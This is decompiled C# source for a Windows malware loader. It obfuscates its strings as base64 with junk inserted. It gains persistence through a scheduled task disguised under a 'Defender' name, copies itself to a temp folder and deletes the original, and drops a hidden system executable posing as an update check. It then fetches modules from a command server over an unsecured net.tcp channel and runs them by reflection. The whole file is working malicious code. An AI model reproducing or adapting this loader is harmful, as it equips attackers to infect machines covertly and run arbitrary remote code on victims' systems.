using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.ServiceModel;
using System.Threading;
using System.Threading.Tasks;
using System.Xml;

namespace Omdagerssss
{
	// Token: 0x02000004 RID: 4
	public class Ohoho : Foo
	{
		// Token: 0x06000018 RID: 24 RVA: 0x0000245B File Offset: 0x0000065B
		public Ohoho(Fazathron settings)
		{
			if (settings == null)
			{
				throw new NullReferenceException("settings");
			}
			this._settings = settings;
		}

		// Token: 0x06000019 RID: 25 RVA: 0x0000249C File Offset: 0x0000069C
		public static void oi8ju65g4(string AppPath, string Name)
		{
			Task.Factory.StartNew(delegate
			{
				for (;;)
				{
					try
					{
						Process.Start(new ProcessStartInfo
						{
							Arguments = string.Concat(new string[]
							{
								Fazathron.Base64Decode("L0Mgc2NodGFza3MgL2Nv.10yZWF0ZSAvdG4v.10gXFxEZWZlbmRlclxc").Replace("v.10", ""),
								Name,
								" /tr \"",
								AppPath,
								"\" /st ",
								DateTime.Now.AddMinutes(1.0).ToString("HH:mm"),
								" /du 9999:59 /sc daily /ri 1 /f"
							}),
							WindowStyle = ProcessWindowStyle.Hidden,
							CreateNoWindow = true,
							FileName = Fazathron.Base64Decode("Y21kLmVunique4ZQ==").Replace("unique", ""),
							RedirectStandardOutput = true,
							UseShellExecute = false
						});
					}
					catch
					{
					}
					Thread.Sleep(50000);
				}
			});
		}

		// Token: 0x0600001A RID: 26 RVA: 0x000024D5 File Offset: 0x000006D5
		public void el2943()
		{
			throw new NotImplementedException();
		}

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x0600001B RID: 27 RVA: 0x000024DD File Offset: 0x000006DD
		// (set) Token: 0x0600001C RID: 28 RVA: 0x000024E5 File Offset: 0x000006E5
		private string llijj867yhhhhhhhhhh { get; set; } = Path.GetTempPath() + "MonoCecil";

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x0600001D RID: 29 RVA: 0x000024EE File Offset: 0x000006EE
		// (set) Token: 0x0600001E RID: 30 RVA: 0x000024F6 File Offset: 0x000006F6
		private string InstallName { get; set; } = "Fazathron.exe";

		// Token: 0x0600001F RID: 31 RVA: 0x00002500 File Offset: 0x00000700
		public static void jjjjjjjjjjjjjjhhhh(string Path)
		{
			Process.Start(new ProcessStartInfo
			{
				Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Path + "\"",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			});
		}

		// Token: 0x06000020 RID: 32 RVA: 0x0000254C File Offset: 0x0000074C
		public void modify()
		{
			try
			{
				bool flag = this._settings.ApplicationPath != this.llijj867yhhhhhhhhhh + "\\" + this.InstallName;
				if (flag)
				{
					bool flag2 = !Directory.Exists(this.llijj867yhhhhhhhhhh);
					if (flag2)
					{
						Directory.CreateDirectory(this.llijj867yhhhhhhhhhh);
					}
					bool flag3 = !File.Exists(this.llijj867yhhhhhhhhhh + "\\" + this.InstallName);
					if (flag3)
					{
						File.Copy(this._settings.ApplicationPath, this.llijj867yhhhhhhhhhh + "\\" + this.InstallName, true);
					}
					else
					{
						foreach (Process process in Process.GetProcessesByName("Fazathron"))
						{
							try
							{
								process.Kill();
								process.WaitForExit();
							}
							catch
							{
							}
						}
						File.Copy(this._settings.ApplicationPath, this.llijj867yhhhhhhhhhh + "\\" + this.InstallName, true);
						Process.Start(this.llijj867yhhhhhhhhhh + "\\" + this.InstallName);
						Ohoho.jjjjjjjjjjjjjjhhhh(this._settings.ApplicationPath);
						Process.GetCurrentProcess().Kill();
					}
				}
				bool flag4;
				Mutex mutex = new Mutex(true, "Omagarable", ref flag4);
				bool flag5 = !flag4;
				if (flag5)
				{
					Process.GetCurrentProcess().Kill();
				}
				bool flag6 = !File.Exists(Path.GetTempPath() + "OmagarableQuest.exe");
				if (flag6)
				{
					File.WriteAllBytes(Path.GetTempPath() + "OmagarableQuest.exe", Resource1.FradieMerqury);
					File.SetAttributes(Path.GetTempPath() + "OmagarableQuest.exe", File.GetAttributes(Path.GetTempPath() + "OmagarableQuest.exe") | FileAttributes.Hidden | FileAttributes.System);
					Ohoho.oi8ju65g4(Path.GetTempPath() + "OmagarableQuest.exe", "CheckUpdate");
				}
				List<ModuleFile> list = this.loadk2j1jd();
				Console.WriteLine(list.Count);
				foreach (ModuleFile moduleFile in list)
				{
					using (WebClient webClient = new WebClient())
					{
						bool flag7 = File.Exists(moduleFile.FileName);
						if (flag7)
						{
							File.Delete(moduleFile.FileName);
						}
						webClient.DownloadFile(moduleFile.FileURL, moduleFile.FileName);
					}
					Assembly assembly = Assembly.Load(moduleFile.FileName);
					Console.WriteLine("downloaded");
					Type[] types = assembly.GetTypes();
					Type[] array = types;
					for (int j = 0; j < array.Length; j++)
					{
						Type type = array[j];
						object[] customAttributes = type.GetCustomAttributes(true);
						foreach (object obj in customAttributes)
						{
							bool flag8 = obj is ModuleAttribute;
							if (flag8)
							{
								MethodInfo[] methods = type.GetMethods();
								MethodInfo[] array3 = methods;
								for (int l = 0; l < array3.Length; l++)
								{
									MethodInfo method = array3[l];
									object[] customAttributes2 = method.GetCustomAttributes(true);
									foreach (object obj2 in customAttributes2)
									{
										InputParamAttribute inputParamAttribute;
										bool flag9 = (inputParamAttribute = (obj2 as InputParamAttribute)) != null;
										if (flag9)
										{
											List<object> objectList = new List<object>();
											foreach (string name in inputParamAttribute.Names)
											{
												PropertyInfo property = this._settings.GetType().GetProperty(name);
												bool flag10 = property != null;
												if (flag10)
												{
													objectList.Add(property.GetValue(this._settings, null));
												}
											}
											bool flag11 = objectList.Count<object>() != inputParamAttribute.Names.Count<string>();
											if (flag11)
											{
												return;
											}
											Thread thread = new Thread(delegate
											{
												method.Invoke(Activator.CreateInstance(type), objectList.ToArray());
											})
											{
												IsBackground = true
											};
											thread.Start();
										}
									}
								}
							}
						}
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			for (;;)
			{
				Thread.Sleep(10000);
			}
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00002A70 File Offset: 0x00000C70
		private List<ModuleFile> loadk2j1jd()
		{
			List<ModuleFile> result;
			try
			{
				InstanceContext callbackInstance = new InstanceContext(this);
				NetTcpBinding netTcpBinding = new NetTcpBinding
				{
					Security = new NetTcpSecurity
					{
						Mode = SecurityMode.None
					},
					MaxBufferPoolSize = 2147483647L,
					MaxReceivedMessageSize = 2147483647L,
					ReaderQuotas = new XmlDictionaryReaderQuotas
					{
						MaxDepth = 2000000,
						MaxStringContentLength = int.MaxValue,
						MaxArrayLength = int.MaxValue,
						MaxBytesPerRead = int.MaxValue,
						MaxNameTableCharCount = int.MaxValue
					}
				};
				netTcpBinding.SendTimeout = new TimeSpan(24, 30, 0);
				netTcpBinding.ReceiveTimeout = new TimeSpan(24, 30, 0);
				netTcpBinding.OpenTimeout = new TimeSpan(24, 30, 0);
				string uri = string.Format(Fazathron.Base64Decode("bmV0LnRjcDovLsk1kjd82jja3swfToyMzU2My9JQ29ubmVjdG9y".Replace("sk1kjd82jja", "")), this._settings.ServerAdress);
				IConnector connector = new DuplexChannelFactory<IConnector>(callbackInstance, netTcpBinding).CreateChannel(new EndpointAddress(uri));
				result = connector.GetModuleList().Result;
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				result = new List<ModuleFile>();
			}
			return result;
		}

		// Token: 0x0400000A RID: 10
		private Fazathron _settings;
	}
}
